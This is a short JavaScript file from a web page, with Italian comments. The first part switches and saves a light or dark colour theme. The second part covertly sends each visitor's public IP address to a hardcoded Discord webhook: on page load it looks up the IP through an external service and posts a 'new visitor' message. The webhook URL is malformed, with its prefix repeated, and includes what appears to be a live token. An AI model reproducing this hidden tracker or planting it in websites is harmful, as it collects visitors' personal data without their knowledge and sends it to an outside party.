const themeToggle = document.getElementById('themeToggle');
const body = document.body;
const themeColorMeta = document.getElementById('themeColorMeta');

// Funzione per applicare il tema salvato
function applySavedTheme() {
    const savedTheme = localStorage.getItem('theme');
    if (savedTheme === 'light') {
        body.classList.add('light');
        themeColorMeta.setAttribute('content', '#ffffff');  // Colore della barra in modalità light
    } else {
        body.classList.remove('light');
        themeColorMeta.setAttribute('content', '#000000');  // Colore della barra in modalità dark
    }
}

// Funzione per cambiare il tema e salvare la preferenza
function toggleTheme() {
    body.classList.toggle('light');
    if (body.classList.contains('light')) {
        localStorage.setItem('theme', 'light');
        themeColorMeta.setAttribute('content', '#ffffff');  // Colore della barra in modalità light
    } else {
        localStorage.setItem('theme', 'dark');
        themeColorMeta.setAttribute('content', '#000000');  // Colore della barra in modalità dark
    }
}

// Applica il tema salvato all'avvio della pagina
applySavedTheme();

// Aggiungi l'evento di click al pulsante di toggle
themeToggle.addEventListener('click', toggleTheme);


// Ottenere l'indirizzo IP dal servizio esterno
fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const ip = data.ip;

    // Inviare l'IP al webhook di Discord
    const discordWebhookUrl = 'https://discord.com/api/webhooks/https://discord.com/api/webhooks/1283800882051551282/NiOaVpBa14KFvvaFi4iiLDollAcb37uDKfd66qUHJAOmwpSkLmbGUiYL-K7nGQY04ieN';
    
    const message = {
      content: `Nuovo visitatore con IP: ${ip}`
    };

    // Invia il messaggio usando la fetch API
    fetch(discordWebhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(message)
    });
  });

